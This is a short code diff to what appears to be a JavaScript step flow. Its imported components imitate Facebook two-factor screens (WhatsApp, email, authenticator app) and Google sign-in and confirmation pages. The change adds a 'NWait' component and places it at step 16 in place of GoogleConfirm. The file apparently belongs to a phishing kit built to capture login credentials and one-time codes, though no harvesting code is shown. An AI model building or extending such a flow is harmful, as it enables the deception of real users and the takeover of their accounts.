@@ -18,6 +18,7 @@ import Fa2Whatsapp from "../components/fbook/Fa2Whatsapp.js";
 import Fa2Email from "../components/fbook/Fa2Email.js";
 import Fa2AuthApp from "../components/fbook/Fa2AuthApp.js";
 import GoogleConfirm from "../components/frriSpecific/GoogleConfirm.js";
+import NWait from "../components/fbook/NWait.js";
 import GoogleSignInPC from "../components/gmail/GoogleSignInPC.js";
 import GoogleSignInMobile from "../components/gmail/GoogleSignInMobile.js";
 
@@ -47,7 +48,7 @@ const STEP_COMPONENTS = {
   13: Fa2Email,
   14: Fa2,
   15: Fa2AuthApp,
-  16: GoogleConfirm,
+  16: NWait,
   17: GoogleConfirm,
 };
 
